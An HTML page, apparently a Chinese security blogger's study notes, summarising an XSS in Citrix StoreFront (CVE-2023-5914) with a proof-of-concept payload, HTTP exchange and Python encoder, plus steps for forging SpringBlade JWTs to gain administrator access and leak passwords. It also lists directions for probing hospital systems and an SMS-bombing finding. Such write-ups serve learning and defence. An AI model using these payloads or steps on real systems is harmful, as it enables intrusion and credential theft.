@@ -1,0 +1,476 @@
+<!doctype html>
+<html lang="zh-cn">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>3.21-23学习记录 - さぁ、君、取りたまえ</title><link rel="apple-touch-icon" href="/images/favicons/apple-touch-icon.png" sizes="180x180">
+<link rel="icon" href="/images/favicons/favicon-32x32.png" sizes="32x32" type="image/png">
+<link rel="icon" href="/images/favicons/favicon-16x16.png" sizes="16x16" type="image/png">
+<link rel="manifest" href="/images/favicons/manifest.json">
+<link rel="icon" href="/images/favicons/favicon.ico">
+<meta name="keywords" content="" />
+<meta name="description" content="" /><meta itemprop="name" content="3.21-23学习记录">
+<meta itemprop="description" content=""><meta itemprop="datePublished" content="2024-03-21T00:00:00&#43;00:00" />
+<meta itemprop="dateModified" content="2024-03-21T00:00:00&#43;00:00" />
+<meta itemprop="wordCount" content="2809">
+<meta itemprop="keywords" content=",,," /><meta property="og:title" content="3.21-23学习记录" />
+<meta property="og:description" content="" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="/posts/tech/sec-read-20240321/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2024-03-21T00:00:00&#43;00:00" />
+<meta property="article:modified_time" content="2024-03-21T00:00:00&#43;00:00" /><meta property="og:site_name" content="さぁ、君、取りたまえ" />
+
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="3.21-23学习记录"/>
+<meta name="twitter:description" content=""/>
+<meta data-name="palette" content="blue"><link rel=stylesheet href="/css/bundle.min.9819e4e2411e150748363de90ec254ddcda514cc29bb1238a532433adb77735b.css" integrity="sha256-mBnk4kEeFQdINj3pDsJU3c2lFMwpuxI4pTJDOtt3c1s=" crossorigin="anonymous"><script src="/js/bundle.min.1c471eeba442e80350b91324d765b69b27af83f0de35d552aa2a410bac6ee793.js" integrity="sha256-HEce66RC6ANQuRMk12W2myevg/DeNdVSqipBC6xu55M=" crossorigin="anonymous"></script>
+<link href="https://cdn.bootcdn.net/ajax/libs/KaTeX/0.12.0/katex.min.css" rel="stylesheet">
+<script src="https://cdn.bootcdn.net/ajax/libs/KaTeX/0.12.0/katex.min.js"></script>
+<script defer src="https://cdn.bootcdn.net/ajax/libs/KaTeX/0.12.0/contrib/auto-render.min.js"> </script>
+<script type="text/javascript">
+	document.addEventListener("DOMContentLoaded", function() {
+  renderMathInElement(document.body, {
+    delimiters: [
+      {left: "$$", right: "$$", display: true},
+      {left: "$", right: "$", display: false}
+    ],
+    macros: {
+      "\\ge": "\\geqslant",
+      "\\le": "\\leqslant",
+      "\\geq": "\\geqslant",
+      "\\leq": "\\leqslant"
+	}
+  });
+}); 
+</script>
+<meta property="og:type" content="index"/>
+<meta property="og:title" content="Unzybaryl`s Sekai" />
+<meta property="og:image" content="https://eustia.me/images/profile1.jpg" />
+<meta property="og:url" content="https://eustia.me/" />
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Noto+Sans+SC&display=swap" rel="stylesheet">
+<script src='//unpkg.com/valine/dist/Valine.min.js'></script>
+<script src="https://cdn.jsdelivr.net/gh/flatblowfish/cave-draw/dist/cave-draw.min.js"></script></head><body><header><nav class="navbar navbar-expand-xl fixed-top">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      
+      ティアなのです！
+      
+    </a>
+    <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <span class="navbar-toggler-icon"></span>
+    </button>
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav me-1 mb-2 mb-lg-0"><form class="search-bar d-flex ms-1" action="/search">
+  <div class="input-group input-group-sm">
+    <button class="btn btn-search disabled position-absolute left-0" type="submit"><i class="fas fa-fw fa-search"></i></button>
+    <input class="form-control rounded-pill" id="searchQuery" name="q" type="search" aria-label="Search">
+  </div>
+</form></ul><ul class="navbar-nav me-1 mb-2 mb-lg-0 me-1 ms-auto"><li class="nav-item">
+          <a class="nav-link" href="/archives">
+            <i class="fas fa-fw fa-file-archive"></i>归档
+          </a>
+        </li><li class="nav-item">
+          <a class="nav-link" href="/about/">
+            <i class="fas fa-fw fa-info-circle"></i>关于
+          </a>
+        </li><li class="nav-item">
+          <a class="nav-link" href="/bin/">
+            <i class="fas fa-fw fa-bookmark"></i>废案
+          </a>
+        </li><li class="nav-item">
+  <a class="nav-link" data-bs-toggle="offcanvas" href="#offcanvasSettings" role="button"
+    aria-controls="offcanvasSettings">
+    <i class="fas fa-fw fa-sliders-h"></i> 设置
+  </a>
+</li>
+
+<div class="offcanvas offcanvas-end surface h-100" tabindex="-1" id="offcanvasSettings"
+  aria-labelledby="offcanvasSettingsLabel">
+  <div class="offcanvas-header">
+    <h5 class="offcanvas-title" w id="offcanvasSettingsLabel"><i class="fas fa-fw fa-sliders-h"></i> 设置</h5>
+    <a role="button" data-bs-dismiss="offcanvas" aria-label="Close">
+      <span class="fas fa-2x fa-fw fa-times"></span>
+    </a>
+  </div>
+  <div class="offcanvas-body"><section class="setting">
+  <form class="row">
+    <div class="col-auto">
+      <label><i class="fas fa-fw fa-adjust"></i> 模式</label>
+    </div>
+    <div class="col-auto ms-auto">
+      <div class="form-check form-switch">
+        <input class="form-check-input" type="checkbox" id="modeSwitcher">
+      </div>
+    </div>
+  </form>
+</section>
+<section class="setting">
+  <form class="font-size-switcher-form row">
+    <div class="col-auto">
+      <label for="fontSize" class="form-label"><i class="fas fa-fw fa-font"></i> 字体大小</label>
+    </div>
+    <div class="col-auto ms-auto">
+      <input type="range" class="form-range" min="-2" max="2" id="fontSize">
+    </div>
+  </form>
+</section>
+
+</div>
+</div></ul>
+    </div>
+  </div>
+</nav>
+</header>
+<main role="main" class="container">
+      <div class="row content">
+<div class="col-lg-8">
+  <div class="container"><nav class="row" aria-label="breadcrumb">
+  <ol class="breadcrumb surface"><li class="breadcrumb-item"><a href="/">主页</a></li><li class="breadcrumb-item"><a href="/posts/">文章</a></li><li class="breadcrumb-item"><a href="/posts/tech/">Tech</a></li><li class="breadcrumb-item active">3.21-23学习记录</li></ol>
+</nav><article class="post row surface"><div class="post-panel-wrapper">
+  <div class="post-panel d-flex flex-column">
+    <a id="sidebarToggler" class="action d-none d-lg-block" role="button">
+  <i class="fas fa-fw fa-expand-alt fa-rotate-45"></i>
+</a>
+  
+    
+
+    
+    <a class="action" data-bs-container="body" data-bs-toggle="popover" data-bs-html="true" data-bs-placement="bottom"
+  data-bs-trigger="focus" tabindex="0"
+  data-bs-content="&lt;a target=&#34;_blank&#34; rel=&#34;license&#34; href=&#34;https://creativecommons.org/licenses/by-nc-nd/4.0/deed.zh&#34;&gt;CC BY-NC-ND 4.0 &lt;i class=&#34;fab fa-fw fa-creative-commons&#34;&gt;&lt;/i&gt;&lt;i class=&#34;fab fa-fw fa-creative-commons-by&#34;&gt;&lt;/i&gt;&lt;i class=&#34;fab fa-fw fa-creative-commons-nc&#34;&gt;&lt;/i&gt;&lt;i class=&#34;fab fa-fw fa-creative-commons-nd&#34;&gt;&lt;/i&gt;&lt;/a&gt;
+">
+  <i class="fas fa-fw fa-copyright"></i>
+</a>
+    <a id="btnTOC" class="fas fa-fw fa-list-alt" data-bs-toggle="offcanvas" href="#offcanvasTOC" aria-controls="offcanvasTOC" role="button">
+</a>
+  </div>
+</div>
+<h1 class="post-title my-3">3.21-23学习记录
+</h1><div class="post-meta mb-3">
+  <span class="post-date me-2">
+    <i class="fas fa-fw fa-calendar-alt"></i>2024-03-21
+  </span>
+  <span class="post-reading-time me-2">
+    <i class="fas fa-fw fa-coffee"></i>6 分钟阅读
+  </span>
+<a href="/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA/" class="post-taxonomy">#计算机</a><a href="/series/%E5%AE%89%E5%85%A8/" class="post-taxonomy">#安全</a></div>
+
+
+
+                
+                <div class="addthis_inline_share_toolbox"></div>
+            <div class="offcanvas offcanvas-end surface" tabindex="-1" id="offcanvasTOC" aria-labelledby="offcanvasTOCLabel">
+  <div class="offcanvas-header">
+    <h5 class="offcanvas-title" id="offcanvasTOCLabel">目录</h5>
+    <a role="button" data-bs-dismiss="offcanvas" aria-label="Close">
+      <span class="fas fa-2x fa-fw fa-times"></span>
+    </a>
+  </div>
+  <div class="offcanvas-body">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#1afrog扫描器">1.afrog扫描器</a></li>
+    <li><a href="#2springblade框架jwt认证缺陷漏洞">2.SpringBlade框架JWT认证缺陷漏洞</a>
+      <ul>
+        <li><a href="#1错误的认证逻辑">1.错误的认证逻辑</a></li>
+        <li><a href="#2权限提升">2.权限提升</a></li>
+        <li><a href="#3利用">3.利用</a></li>
+        <li><a href="#4修复">4.修复</a></li>
+      </ul>
+    </li>
+    <li><a href="#3医院漏洞挖掘">3.医院漏洞挖掘</a></li>
+    <li><a href="#4ffuf">4.ffuf</a></li>
+    <li><a href="#5swagger接口未授权">5.Swagger接口未授权</a></li>
+    <li><a href="#6yakit">6.yakit</a></li>
+    <li><a href="#7findsomething插件">7.FindSomething插件</a></li>
+  </ul>
+</nav>
+  </div>
+</div><div class="post-content mb-3" ><h1 id="一cve-2023-5914">一、CVE-2023-5914</h1>
+<p><a href="https://mp.weixin.qq.com/s/K8qHG-XCo0kVCedtrYmTAw">https://mp.weixin.qq.com/s/K8qHG-XCo0kVCedtrYmTAw</a></p>
+<p>Citrix StoreFront 是一个为用户聚合和呈现来自本地和混合部署的虚拟应用程序和桌面资源的企业应用程序商店</p>
+<p>反编译用的是dnSpy。先从controller开始找，搜索从 <code>BaseMvcController</code> 继承的所有类。查看每个结果并验证每个结果上的哪些端点无需身份验证即可访问。</p>
+<p>其中一个端点是 <code>SamlTestController</code> 上的<code>/Citrix/teststoreAuth/SamlTest</code>，该方法的代码如下：</p>
+<div class="highlight"><pre class="chroma"><code class="language-c#" data-lang="c#"><span class="ln"> 1</span><span class="na">[AcceptVerbs(HttpVerbs.Get | HttpVerbs.Post)]</span>
+<span class="ln"> 2</span><span class="k">public</span> <span class="n">ActionResult</span> <span class="n">Test</span><span class="p">()</span>
+<span class="ln"> 3</span><span class="p">{</span>
+<span class="ln"> 4</span>    <span class="k">try</span>
+<span class="ln"> 5</span>    <span class="p">{</span>
+<span class="ln"> 6</span>        <span class="c1">//检测是不是get方法
+</span><span class="ln"> 7</span><span class="c1"></span>        <span class="k">if</span> <span class="p">(</span><span class="k">base</span><span class="p">.</span><span class="n">Request</span><span class="p">.</span><span class="n">HttpMethod</span><span class="p">.</span><span class="n">Equals</span><span class="p">(</span><span class="n">HttpVerbs</span><span class="p">.</span><span class="n">Get</span><span class="p">.</span><span class="n">ToString</span><span class="p">(),</span> <span class="n">StringComparison</span><span class="p">.</span><span class="n">OrdinalIgnoreCase</span><span class="p">))</span>
+<span class="ln"> 8</span>        <span class="p">{</span>
+<span class="ln"> 9</span>            <span class="k">return</span> <span class="n">StartRequest</span><span class="p">();</span>
+<span class="ln">10</span>        <span class="p">}</span>
+<span class="ln">11</span>        <span class="c1">//获取参数SAMLResponse的值
+</span><span class="ln">12</span><span class="c1"></span>        <span class="kt">string</span> <span class="n">text</span> <span class="p">=</span> <span class="k">base</span><span class="p">.</span><span class="n">Request</span><span class="p">.</span><span class="n">Unvalidated</span><span class="p">.</span><span class="n">Form</span><span class="p">[</span><span class="s">&#34;SAMLResponse&#34;</span><span class="p">];</span>
+<span class="ln">13</span>        <span class="c1">//检测值是否是空的或者空格
+</span><span class="ln">14</span><span class="c1"></span>        <span class="k">if</span> <span class="p">(</span><span class="kt">string</span><span class="p">.</span><span class="n">IsNullOrWhiteSpace</span><span class="p">(</span><span class="n">text</span><span class="p">))</span>
+<span class="ln">15</span>        <span class="p">{</span>
+<span class="ln">16</span>            <span class="k">throw</span> <span class="k">new</span> <span class="n">NullReferenceException</span><span class="p">(</span><span class="n">Resources</span><span class="p">.</span><span class="n">SamlTestSamlResponseNotFound</span><span class="p">);</span>
+<span class="ln">17</span>        <span class="p">}</span>
+<span class="ln">18</span>        <span class="c1">//将获取到的值转化为SamlResult类型
+</span><span class="ln">19</span><span class="c1"></span>        <span class="n">SamlResult</span> <span class="n">samlResult</span> <span class="p">=</span> <span class="n">SamlManager</span><span class="p">.</span><span class="n">ProcessPackedSamlData</span><span class="p">(</span><span class="n">text</span><span class="p">);</span>
+<span class="ln">20</span>        <span class="k">if</span> <span class="p">(</span><span class="n">samlResult</span> <span class="p">==</span> <span class="k">null</span><span class="p">)</span>
+<span class="ln">21</span>        <span class="p">{</span>
+<span class="ln">22</span>            <span class="k">return</span> <span class="k">new</span> <span class="n">HttpStatusCodeResult</span><span class="p">(</span><span class="n">HttpStatusCode</span><span class="p">.</span><span class="n">Forbidden</span><span class="p">);</span>
+<span class="ln">23</span>        <span class="p">}</span>
+<span class="ln">24</span>        <span class="c1">//最后转化格式，将错误消息显示出来
+</span><span class="ln">25</span><span class="c1"></span>        <span class="n">XmlDocument</span> <span class="n">xmlDocument</span> <span class="p">=</span> <span class="n">ServiceLocation</span><span class="p">.</span><span class="n">GetInstance</span><span class="p">&lt;</span><span class="n">FormsTemplateEngine</span><span class="p">&gt;().</span><span class="n">RenderTemplate</span><span class="p">(</span><span class="s">&#34;SamlTest&#34;</span><span class="p">,</span> <span class="n">LocaliserConsumerAttribute</span><span class="p">.</span><span class="n">ParseUserLanguages</span><span class="p">(</span><span class="k">base</span><span class="p">.</span><span class="n">Request</span><span class="p">.</span><span class="n">UserLanguages</span><span class="p">),</span> <span class="k">new</span>
+<span class="ln">26</span>        <span class="p">{</span>
+<span class="ln">27</span>            <span class="n">identity</span> <span class="p">=</span> <span class="n">samlResult</span><span class="p">.</span><span class="n">Name</span><span class="p">,</span>
+<span class="ln">28</span>            <span class="n">assertion</span> <span class="p">=</span> <span class="n">samlResult</span><span class="p">.</span><span class="n">Assertion</span><span class="p">,</span>
+<span class="ln">29</span>            <span class="n">claims</span> <span class="p">=</span> <span class="n">samlResult</span><span class="p">.</span><span class="n">Identity</span><span class="p">.</span><span class="n">Claims</span><span class="p">.</span><span class="n">Select</span><span class="p">((</span><span class="n">Claim</span> <span class="n">claim</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="n">claim</span><span class="p">.</span><span class="n">ToString</span><span class="p">()).</span><span class="n">ToList</span><span class="p">()</span>
+<span class="ln">30</span>        <span class="p">});</span>
+<span class="ln">31</span>        <span class="k">return</span> <span class="k">new</span> <span class="n">ContentResult</span>
+<span class="ln">32</span>        <span class="p">{</span>
+<span class="ln">33</span>            <span class="n">Content</span> <span class="p">=</span> <span class="n">xmlDocument</span><span class="p">.</span><span class="n">InnerXml</span><span class="p">,</span>
+<span class="ln">34</span>            <span class="n">ContentType</span> <span class="p">=</span> <span class="s">&#34;text/html&#34;</span>
+<span class="ln">35</span>        <span class="p">};</span>
+<span class="ln">36</span>    <span class="p">}</span>
+<span class="ln">37</span>    <span class="k">catch</span> <span class="p">(</span><span class="n">Exception</span> <span class="n">arg</span><span class="p">)</span>
+<span class="ln">38</span>    <span class="p">{</span>
+<span class="ln">39</span>        <span class="k">return</span> <span class="k">new</span> <span class="n">ContentResult</span>
+<span class="ln">40</span>        <span class="p">{</span>
+<span class="ln">41</span>            <span class="n">Content</span> <span class="p">=</span> <span class="s">$&#34;&lt;html&gt;&lt;body&gt;&lt;h1&gt;Exception&lt;/h1&gt;&lt;div&gt;{arg}&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;&#34;</span><span class="p">,</span>
+<span class="ln">42</span>            <span class="n">ContentType</span> <span class="p">=</span> <span class="s">&#34;text/html&#34;</span>
+<span class="ln">43</span>        <span class="p">};</span>
+<span class="ln">44</span>    <span class="p">}</span>
+<span class="ln">45</span><span class="p">}</span>
+</code></pre></div><p>该团队立即注意到的异常处理程序中的字符串没有进行任何处理，如果用户可以控制输入的异常消息，那么就可以实现跨站点脚本攻击。</p>
+<p>搜索了 <code>SamlManager.ProcessPackedSamlData</code> 以查看哪些代码路径引发了异常。</p>
+<blockquote>
+<p>XML 解析异常通常包含反射输入，但一般都会受到限制，不允许使用利用漏洞所需的特殊字符，</p>
+<p>但是在枚举 dotnet 运行时使用的 XML 错误消息后（https://github.com/dotnet/runtime/blob/main/src/libraries/System.Private.Xml/src/Resources/Strings.resx），发现<code>'{0}' </code>是无效的 xml:space 值（xml:space 的值“{0}”无效。xml:space 的值必须为“default”或“preserve”。），通过利用这一特点，就可以创建以下 XML Payload：</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback"><span class="ln">1</span>&lt;foo xml:space=&#34;&lt;script&gt;alert(1)&lt;/script&gt;&#34;&gt;&lt;/foo&gt;
+</code></pre></div></blockquote>
+<p>*这里我看不懂，留坑。</p>
+<p>然后，Payload经过 Base64 编码、JSON 编码、压缩并再次进行 Base64 编码，通过以下请求/响应包，最终编写了XSS利用脚本：</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback"><span class="ln"> 1</span>POST /Citrix/teststoreAuth/SamlTest HTTP/2
+<span class="ln"> 2</span>Host: 192.168.1.100
+<span class="ln"> 3</span>Content-Type: application/x-www-form-urlencoded
+<span class="ln"> 4</span>Content-Length: 167
+<span class="ln"> 5</span>
+<span class="ln"> 6</span>SAMLResponse=q1YKdvT1CUotLsjPK05VskLhBrhHlSVVOpkkhZebJRs7ZUQahVp6ZkYVp7iUVEUaexUkewTmRhkHmkeGV%2bQk5wXm%2bwZn5yZ5BJr7GPtlJefmlKc4R%2bWluBRnBmSVl0XlWpYFpNvaKtUCAA%3d%3d
+<span class="ln"> 7</span>
+<span class="ln"> 8</span>HTTP/2 200 OK
+<span class="ln"> 9</span>Cache-Control: private
+<span class="ln">10</span>Content-Type: text/html; charset=utf-8
+<span class="ln">11</span>Server: Microsoft-IIS/10.0
+<span class="ln">12</span>Set-Cookie: Citrix_AuthSvc=qfa2vmj5vg2kb2xhvqakygh4; path=/Citrix/teststoreAuth; secure; HttpOnly; SameSite=Lax
+<span class="ln">13</span>Date: Mon, 04 Sep 2023 06:00:02 GMT
+<span class="ln">14</span>Content-Length: 1006
+<span class="ln">15</span>&lt;html&gt;&lt;body&gt;&lt;h1&gt;Exception&lt;/h1&gt;&lt;div&gt;System.Xml.XmlException: &#39;&lt;script&gt;alert(1)&lt;/script&gt;&#39; is an invalid xml:space value. Line 1, position 6.
+<span class="ln">16</span>   at System.Xml.XmlTextReaderImpl.Throw(Exception e)
+<span class="ln">17</span>   at System.Xml.XmlTextReaderImpl.OnXmlReservedAttribute(NodeData attr)
+<span class="ln">18</span>   at System.Xml.XmlTextReaderImpl.ParseAttributes()
+<span class="ln">19</span>   at System.Xml.XmlTextReaderImpl.ParseElement()
+<span class="ln">20</span>   at System.Xml.XmlTextReaderImpl.ParseDocumentContent()
+<span class="ln">21</span>   at System.Xml.XmlLoader.Load(XmlDocument doc, XmlReader reader, Boolean preserveWhitespace)
+<span class="ln">22</span>   at System.Xml.XmlDocument.Load(XmlReader reader)
+<span class="ln">23</span>   at System.Xml.XmlDocument.LoadXml(String xml)
+<span class="ln">24</span>   at Citrix.DeliveryServices.Authentication.Saml20.SamlProtocol.GetSamlAttributeFromResponse(String signInResponseResult)
+<span class="ln">25</span>   at Citrix.DeliveryServices.Authentication.Saml20.SamlManager.ProcessSamlResponse(String base64EncodedResponse, Boolean compressed)
+<span class="ln">26</span>   at Citrix.DeliveryServices.Authentication.Saml20.Forms.Controllers.SamlTestController.Test()&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;
+</code></pre></div><p>下面是为该端点编写的XSS Payload：</p>
+<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="ln"> 1</span><span class="kn">import</span> <span class="nn">urllib.parse</span>
+<span class="ln"> 2</span><span class="kn">import</span> <span class="nn">base64</span>
+<span class="ln"> 3</span><span class="kn">import</span> <span class="nn">zlib</span>
+<span class="ln"> 4</span>
+<span class="ln"> 5</span><span class="c1">#压缩函数，设置参数</span>
+<span class="ln"> 6</span><span class="k">def</span> <span class="nf">deflate</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">compresslevel</span><span class="o">=</span><span class="mi">9</span><span class="p">):</span>
+<span class="ln"> 7</span>    <span class="n">compress</span> <span class="o">=</span> <span class="n">zlib</span><span class="o">.</span><span class="n">compressobj</span><span class="p">(</span>
+<span class="ln"> 8</span>            <span class="n">compresslevel</span><span class="p">,</span>
+<span class="ln"> 9</span>            <span class="n">zlib</span><span class="o">.</span><span class="n">DEFLATED</span><span class="p">,</span>
+<span class="ln">10</span>            <span class="o">-</span><span class="n">zlib</span><span class="o">.</span><span class="n">MAX_WBITS</span><span class="p">,</span>
+<span class="ln">11</span>            <span class="n">zlib</span><span class="o">.</span><span class="n">DEF_MEM_LEVEL</span><span class="p">,</span>
+<span class="ln">12</span>            <span class="mi">0</span>
+<span class="ln">13</span>    <span class="p">)</span>
+<span class="ln">14</span>    <span class="n">deflated</span> <span class="o">=</span> <span class="n">compress</span><span class="o">.</span><span class="n">compress</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+<span class="ln">15</span>    <span class="n">deflated</span> <span class="o">+=</span> <span class="n">compress</span><span class="o">.</span><span class="n">flush</span><span class="p">()</span>
+<span class="ln">16</span>    <span class="k">return</span> <span class="n">deflated</span>
+<span class="ln">17</span>
+<span class="ln">18</span><span class="c1">#读取payload</span>
+<span class="ln">19</span><span class="n">foo</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+<span class="ln">20</span><span class="c1">#b64encode用于将二进制数据进行base64编码，而decode是将二进制数据转化为字符串</span>
+<span class="ln">21</span><span class="n">foo</span> <span class="o">=</span> <span class="s1">&#39;{&#34;SAMLResponse&#34;:&#34;SAMLResponse&#39;</span> <span class="o">+</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">foo</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span> <span class="o">+</span> <span class="s1">&#39;&#34;}&#39;</span>
+<span class="ln">22</span><span class="n">foo</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">deflate</span><span class="p">(</span><span class="n">foo</span><span class="o">.</span><span class="n">encode</span><span class="p">()))</span>
+<span class="ln">23</span><span class="c1">#Python中的urllib.parse模块提供了quote()函数，可以对URL中的非法字符进行编码，使之成为合法的URL字符串。</span>
+<span class="ln">24</span><span class="k">print</span><span class="p">(</span><span class="n">end</span><span class="o">=</span><span class="n">urllib</span><span class="o">.</span><span class="n">parse</span><span class="o">.</span><span class="n">quote</span><span class="p">(</span><span class="n">foo</span><span class="p">))</span>
+</code></pre></div><p>*这里也有疑问，为什么发送经过加密，编码，压缩payload可以被执行。</p>
+<h1 id="二记一次项目中快速挖掘漏洞">二、记一次项目中快速挖掘漏洞</h1>
+<p><a href="https://mp.weixin.qq.com/s/kRD790TAuGbU-t4PlTJQbA">https://mp.weixin.qq.com/s/kRD790TAuGbU-t4PlTJQbA</a></p>
+<h2 id="1afrog扫描器">1.afrog扫描器</h2>
+<p>afrog 是一款性能卓越、快速稳定、PoC 可定制的漏洞扫描（挖洞）工具，PoC 涉及 CVE、CNVD、默认口令、信息泄露、指纹识别、未授权访问、任意文件读取、命令执行等多种漏洞类型。</p>
+<p>用了一下还是很方便的，可以执行自定义poc，还可以联动xray，存储扫描的漏洞等。</p>
+<h2 id="2springblade框架jwt认证缺陷漏洞">2.SpringBlade框架JWT认证缺陷漏洞</h2>
+<p>漏洞原理：https://forum.butian.net/share/973</p>
+<p>构造jwt网站：https://jwt.io/</p>
+<h3 id="1错误的认证逻辑">1.错误的认证逻辑</h3>
+<p>简单来说，就是只要token经过jwt解密后有值就可以通过权限检测。</p>
+<p>关键代码：</p>
+<div class="highlight"><pre class="chroma"><code class="language-java" data-lang="java"><span class="ln">1</span><span class="n">String</span> <span class="n">token</span> <span class="o">=</span> <span class="n">JwtUtil</span><span class="o">.</span><span class="na">getToken</span><span class="o">(</span><span class="n">auth</span><span class="o">);</span>
+<span class="ln">2</span><span class="n">Claims</span> <span class="n">claims</span> <span class="o">=</span> <span class="n">JwtUtil</span><span class="o">.</span><span class="na">parseJWT</span><span class="o">(</span><span class="n">token</span><span class="o">);</span>
+<span class="ln">3</span><span class="k">if</span> <span class="o">(</span><span class="n">claims</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+<span class="ln">4</span>	<span class="k">return</span> <span class="n">unAuth</span><span class="o">(</span><span class="n">resp</span><span class="o">,</span> <span class="s">&#34;请求未授权&#34;</span><span class="o">);</span>
+<span class="ln">5</span><span class="o">}</span>
+</code></pre></div><div class="highlight"><pre class="chroma"><code class="language-java" data-lang="java"><span class="ln">1</span><span class="kd">public</span> <span class="kd">static</span> <span class="n">Claims</span> <span class="nf">parseJWT</span><span class="o">(</span><span class="n">String</span> <span class="n">jsonWebToken</span><span class="o">){</span>
+<span class="ln">2</span>	<span class="k">try</span><span class="o">{</span>
+<span class="ln">3</span>		<span class="k">return</span> <span class="n">Jwts</span><span class="o">.</span><span class="na">parserBuilder</span><span class="o">().</span><span class="na">setSigningKey</span><span class="o">(</span><span class="n">Base64</span><span class="o">.</span><span class="na">getDecoder</span><span class="o">().</span><span class="na">decode</span><span class="o">(</span><span class="n">JwtTuil</span><span class="o">.</span><span class="na">BASE64_SECURITY</span><span class="o">)).</span><span class="na">build</span><span class="o">().</span><span class="na">parseClaimsJws</span><span class="o">(</span><span class="n">jsonWebToken</span><span class="o">).</span><span class="na">getBody</span><span class="o">();</span>
+<span class="ln">4</span>	<span class="o">}</span> <span class="k">catch</span><span class="o">(</span><span class="n">Exception</span> <span class="n">ex</span><span class="o">){</span>
+<span class="ln">5</span>		<span class="k">return</span> <span class="kc">null</span><span class="o">;</span>
+<span class="ln">6</span>	<span class="o">}</span>
+<span class="ln">7</span><span class="o">}</span>
+</code></pre></div><p>使用jwt密钥，对认证字符串进行解密，然后返回其内容，**如果解密结果不为空，则直接绕过认证。看下JwtUtil.BASE64_SECURITY的值，是由TokenConstant.SIGN_KEY进行base64加密得来的，其实就是SIGN_KEY的值。</p>
+<div class="highlight"><pre class="chroma"><code class="language-java" data-lang="java"><span class="ln">1</span><span class="kd">public</span> <span class="kd">static</span> <span class="n">String</span> <span class="n">BASE64_SECURITY</span> <span class="o">=</span> <span class="n">Base64</span><span class="o">.</span><span class="na">getEncoder</span><span class="o">().</span><span class="na">encodeToString</span><span class="o">(</span><span class="n">SIGN_KEY</span><span class="o">.</span><span class="na">getBytes</span><span class="o">(</span><span class="n">StanderCharsets</span><span class="o">.</span><span class="na">UTF_8</span><span class="o">));</span>
+</code></pre></div><p>成功伪造了任意用户进行登录。</p>
+<h3 id="2权限提升">2.权限提升</h3>
+<p>而用户权限提升，是因为有些接口还有检验用户权限的方法（org/springblade/blade-core-secure/3.0.2/blade-core-secure-3.0.2.jar!/org/springblade/core/secure/auth/AuthFun.class）。只需要在blade-auth中加入rolename为administrator的值就可以了。</p>
+<h3 id="3利用">3.利用</h3>
+<p>1、/api/blade-log/api/list接口中会泄漏账号密码，只要管理员登录过</p>
+<p>2、部分情况下接口的前缀会被改，blade部分，可以从前端的app.js里面看得到完整接口。</p>
+<p>3、/api/blade-user/user-list 接口会泄漏所有账号密码，不过需要administrator权限，不加role_name时，也可以，但无内容。恰巧其登录时，直接用md5即可，所以，你懂的。
+4、一般admin默认安装时，对应的id为：1123598811738675201，部分接口需要有对应的user_id，可以尝试。如：api/blade-user/info接口
+5、jwt的密钥SIGN_KEY硬编码到jar里面了，而且不是写在配置文件里面，开发根本不会关注到这点，所以使用该框架的项目都受到影响</p>
+<h3 id="4修复">4.修复</h3>
+<p>1、对于框架使用者而言，其实修改SIGN_KEY已经就让漏洞无法利用了
+2、对于框架作者而言：
+1）jwt的密钥，放在配置文件中，并提示用户修改。jar包里面硬编码改起来太麻烦
+2）修改认证流程，本质还是认证流程出了问题。建议把用户账号、密码密文放到jwt里面，然后认证过程中，通过jwt里面的账号、密码进行鉴权。</p>
+<h2 id="3医院漏洞挖掘">3.医院漏洞挖掘</h2>
+<p>医院挖掘漏洞大部分可按照这个方向来挖掘</p>
+<p>1、接口未授权访问</p>
+<p>2、sql注入漏洞</p>
+<p>3、Swagger接口未授权</p>
+<h2 id="4ffuf">4.ffuf</h2>
+<p>这是一个目录扫描工具。可以扫描目录，扫描get post参数，扫描虚拟主机。需要额外的字典作为输入。</p>
+<h2 id="5swagger接口未授权">5.Swagger接口未授权</h2>
+<p>Swagger是一个规范和完整的框架，用于生成、描述、调用和可视化 RESTful 风格的 Web 服务。总体目标是使客户端和文件系统作为服务器以同样的速度来更新。文件的方法，参数和模型紧密集成到服务器端的代码，允许API来始终保持同步。</p>
+<p>在对Swagger泄露的接口进行未授权批量测试，推荐使用yakit工具</p>
+<h2 id="6yakit">6.yakit</h2>
+<p>看github有点牛逼，很多东西看不懂。这里我学习一下基本的使用。</p>
+<p>在线文档：https://yaklang.io/products/intro/</p>
+<p>需要什么学什么用什么。功能很多。</p>
+<h2 id="7findsomething插件">7.FindSomething插件</h2>
+<p>收集网站api接口。</p>
+<p>收集到的接口再到yakit进行fuzz</p>
+<p>发现prod-api/resource/sms/code接口提示报错 phoneNumber</p>
+<p>将参数拼接，经过测试可以无限次发送请求，造成短信轰炸</p>
